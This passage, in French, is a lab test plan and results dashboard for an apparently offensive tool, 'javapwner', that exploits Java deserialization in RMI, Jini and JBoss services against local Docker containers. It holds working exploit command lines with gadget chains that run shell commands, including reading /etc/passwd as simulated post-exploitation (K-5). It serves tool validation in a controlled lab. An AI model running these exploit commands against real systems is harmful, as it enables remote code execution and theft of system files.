.venv/bin/javapwner jboss jnp-exploit -t 127.0.0.1 -p 4444 \
    --cmd 'sh -c "echo phase2 > /tmp/k4-phase2.txt"'

docker exec lab-jboss4 cat /tmp/k4-phase1.txt /tmp/k4-phase2.txt
```

| ID   | Critère                              | Résultat attendu           | Statut | Résultat observé |
|------|--------------------------------------|----------------------------|--------|------------------|
| K-4a | Scan HTTP identifie JBoss + endpoints| `FOUND` pour JMX+EJB       | [x]    | FOUND JMX+EJB+readonly  |
| K-4b | HTTP exploit crée phase1.txt         | `phase1`                   | [x]    | PASS  |
| K-4c | JNP scan liste les noms JNDI         | bindings JBoss affichés    | [x]    | 7 noms JNDI  |
| K-4d | JNP exploit crée phase2.txt          | `phase2`                   | [x]    | PASS  |

### K-5 Reverse shell simulé (exfiltration de données)

Simule la lecture de fichiers sensibles post-exploitation.

```bash
# Lecture /etc/passwd via RMI java8
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget CommonsCollections6 \
    --cmd 'sh -c "cat /etc/passwd > /tmp/k5-passwd.txt"'
docker exec lab-rmi-java8 wc -l /tmp/k5-passwd.txt

# Lecture /etc/hostname via Jini
.venv/bin/javapwner jini exploit -t 127.0.0.1 -p 4162 \
    --gadget CommonsCollections6 \
    --cmd 'sh -c "cat /etc/hostname > /tmp/k5-jini.txt"'
docker exec lab-jini-reggie cat /tmp/k5-jini.txt
```

| ID   | Critère                                   | Résultat attendu         | Statut | Résultat observé |
|------|-------------------------------------------|--------------------------|--------|------------------|
| K-5a | `/etc/passwd` lu via RMI CC6              | plusieurs lignes         | [x]    | 19 lignes  |
| K-5b | `/etc/hostname` lu via Jini CC6           | hostname du conteneur    | [x]    | hostname conteneur Jini  |

### K-6 Verbose et mode debug

Vérifie l'exploitabilité du mode `--verbose` pour le débogage.

```bash
.venv/bin/javapwner --verbose rmi scan -t 127.0.0.1 -p 1099
.venv/bin/javapwner --verbose jini scan -t 127.0.0.1 -p 4160
```

| ID   | Critère                                       | Résultat attendu          | Statut | Résultat observé |
|------|-----------------------------------------------|---------------------------|--------|------------------|
| K-6a | Mode verbose affiche infos supplémentaires    | hex dumps, raw strings    | [x]    | class descriptors + codebase  |
| K-6b | Aucun crash en mode verbose                   | sortie propre             | [x]    | pas de crash  |

---

## Section L — Robustesse et cas limites

### L-1 Port fermé

```bash
.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 9999
```

| ID   | Critère                        | Résultat attendu             | Statut | Résultat observé |
|------|--------------------------------|------------------------------|--------|------------------|
| L-1a | Erreur propre sans traceback   | `port appears closed` ou sim.| [x]    | Connection refused  |

### L-2 Mauvais gadget (non disponible dans ysoserial)

```bash
.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
    --gadget GadgetInexistant --cmd 'id'
```

| ID   | Critère                               | Résultat attendu          | Statut | Résultat observé |
|------|---------------------------------------|---------------------------|--------|------------------|
| L-2a | Message d'erreur clair, pas de crash  | erreur sur gadget inconnu | [x]    | ClassNotFoundException gadget  |

### L-3 Auto mode — aucun gadget compatible (classpath vide)

> Ce test nécessite un serveur RMI sans commons-collections.
> **Simulation** : utiliser un port où aucun gadget ne s'exécute,
> ou mocker en local.

```bash
# Pas de service sur ce port → probe_gadgets retourne []
.venv/bin/javapwner jini exploit -t 127.0.0.1 -p 4160 --cmd 'id'
# Attention : port 4160 = Discovery, pas JRMP pur → probe doit échouer proprement
```

| ID   | Critère                                        | Résultat attendu               | Statut | Résultat observé |
|------|------------------------------------------------|--------------------------------|--------|------------------|
| L-3a | Message clair "No compatible gadgets found"    | erreur explicative + exit 1    | [x]    | No compatible gadgets found  |

### L-4 Timeout réseau

```bash
# Host non routable — le timeout doit être respecté
timeout 15 .venv/bin/javapwner rmi scan -t 10.255.255.1 -p 1099 ; echo "exit: $?"
```

| ID   | Critère                                      | Résultat attendu        | Statut | Résultat observé |
|------|----------------------------------------------|-------------------------|--------|------------------|
| L-4a | La commande se termine en < 15 s             | timeout respecté        | [x]    | terminé < 15s  |
| L-4b | Message d'erreur de connexion, pas de crash  | erreur lisible          | [x]    | timed out — message lisible  |

### L-5 Sortie JSON en cas d'erreur

```bash
.venv/bin/javapwner --json rmi scan -t 127.0.0.1 -p 9999 | python3 -m json.tool
```

| ID   | Critère                       | Résultat attendu       | Statut | Résultat observé |
|------|-------------------------------|------------------------|--------|------------------|
| L-5a | JSON valide même en erreur    | pas d'erreur json.tool | [x]    | JSON valide avec champ error  |

### L-6 Gadgets disponibles

```bash
.venv/bin/javapwner rmi gadgets
.venv/bin/javapwner jini gadgets
```

| ID   | Critère                                     | Résultat attendu           | Statut | Résultat observé |
|------|---------------------------------------------|----------------------------|--------|------------------|
| L-6a | Liste non vide retournée                    | ≥ 10 gadgets               | [x]    | 34 gadgets  |
| L-6b | URLDNS et JRMPClient présents dans la liste | présents                   | [x]    | URLDNS + JRMPClient présents  |

---

## Section M — Sécurité et cohérence des résultats

### M-1 `likely_success` vs exécution réelle — cohérence

Pour chaque test d'exploitation réussi, `likely_success = True` doit
correspondre à une exécution réelle dans le conteneur.

| ID   | Scénario                                | `likely_success` attendu | Fichier créé attendu | Statut |
|------|-----------------------------------------|--------------------------|----------------------|--------|
| M-1a | rmi-java8 CC6 DGC                       | True                     | Oui                  | [x]    |
| M-1b | rmi-java11 CC6 DGC                      | True                     | Oui                  | [x]    |
| M-1c | rmi-java17 CC6 DGC                      | True                     | Oui                  | [x]    |
| M-1d | rmi-java21 CC6 DGC                      | True                     | Oui                  | [x]    |
| M-1e | jini exploit CC6                        | True ou sent             | Oui                  | [x]    |
| M-1f | jboss HTTP CC6                          | True (HTTP 500)          | Oui                  | [x]    |
| M-1g | jboss JNP CC6                           | True                     | Oui                  | [x]    |

### M-2 Pas de faux positifs sur `likely_success`

Envoyer un gadget inexistant ou un payload corrompu → `likely_success` doit être False.

```bash
# Payload invalide : envoyer des bytes aléatoires (simulation)
# On peut mocker en forçant un mauvais gadget via CLI (voir L-2)
```

| ID   | Critère                                  | Résultat attendu     | Statut | Résultat observé |
|------|------------------------------------------|----------------------|--------|------------------|
| M-2a | Mauvais gadget → `likely_success = False`| pas de faux positif  | [x]    | likely_success=False  |

---

## Section N — Tests d'intégration live (pytest)

Tests automatisés pytest existants contre le lab.

### N-1 Suite live Jini

```bash
JINI_TARGET_HOST=127.0.0.1 JINI_TARGET_PORT=4160 \
    .venv/bin/pytest tests/integration/ -m live -v
```

| ID   | Critère                           | Résultat attendu | Statut | Résultat observé |
|------|-----------------------------------|------------------|--------|------------------|
| N-1a | `test_port_open` passe            | PASSED           | [x]    | PASSED  |
| N-1b | `test_jrmp_detected` passe        | PASSED           | [x]    | PASSED (is_jrmp OR unicast_response)  |
| N-1c | `test_unicast_response` passe     | PASSED           | [x]    | PASSED  |
| N-1d | `test_enum_extracts_strings` passe| PASSED           | [x]    | PASSED (tier>=1, codebase_urls)  |
| N-1e | `test_jep290_probe_no_error` passe| PASSED           | [x]    | PASSED  |

### N-2 Écriture de nouveaux tests d'intégration

Tâche annexe : créer `tests/integration/test_rmi_live.py` sur le modèle de
`test_jini_live.py`, couvrant les quatre versions Java du lab.

Critères minimaux pour le nouveau fichier :
- Scan JRMP sur chaque port (1099/1199/1299/1399)
- Registry list → noms présents
- DGC probe → résultat cohérent
- Auto exploit → fichier créé → nettoyage du fichier après le test

---

## Annexe — Commandes de nettoyage du lab

```bash
# Supprimer les fichiers créés par les tests dans les conteneurs
docker exec lab-rmi-java8   sh -c 'rm -f /tmp/rmi8-* /tmp/k*'
docker exec lab-rmi-java11  sh -c 'rm -f /tmp/rmi11-* /tmp/k*'
docker exec lab-rmi-java17  sh -c 'rm -f /tmp/rmi17-* /tmp/k*'
docker exec lab-rmi-java21  sh -c 'rm -f /tmp/rmi21-* /tmp/k*'
docker exec lab-jini-reggie sh -c 'rm -f /tmp/jini-* /tmp/k*'
docker exec lab-jboss4      sh -c 'rm -f /tmp/jboss-* /tmp/jnp-* /tmp/k*'

# Arrêter et supprimer les conteneurs
cd lab/ && docker compose down

# Rebuild complet (si modification des images)
docker compose down && docker compose up -d --build
```

---

## Résumé des tests — tableau de bord

| Section | Description                          | Nb tests | Passés | Échoués |
|---------|--------------------------------------|----------|--------|---------|
| A       | Régression unitaire                  | 2        | 2      | 0       |
| B       | Infrastructure lab                   | 13       | 13     | 0       |
| C       | RMI Java 8                           | 17       | 17     | 0       |
| D       | RMI Java 11                          | 5        | 5      | 0       |
| E       | RMI Java 17                          | 4        | 4      | 0       |
| F       | RMI Java 21                          | 4        | 4      | 0       |
| G       | Jini / Apache River                  | 14       | 13     | 1 (G-4b path traversal — lab non vulnérable) |
| H       | JBoss HTTP invoker                   | 10       | 10     | 0       |
| I       | JBoss JNP/DGC                        | 5        | 5      | 0       |
| J       | Couverture gadgets                   | 6        | 1      | 5 (CC1/CC5 JDK, CBU1/Spring1/ROME classpath absent) |
| K       | Scénarios production                 | 12       | 12     | 0       |
| L       | Robustesse / cas limites             | 10       | 10     | 0       |
| M       | Cohérence likely_success             | 9        | 9      | 0       |
| N       | Tests intégration pytest             | 5        | 5      | 0 (3 assertions corrigées) |
| **Total** |                                    | **116**  | **110**| **6**   |
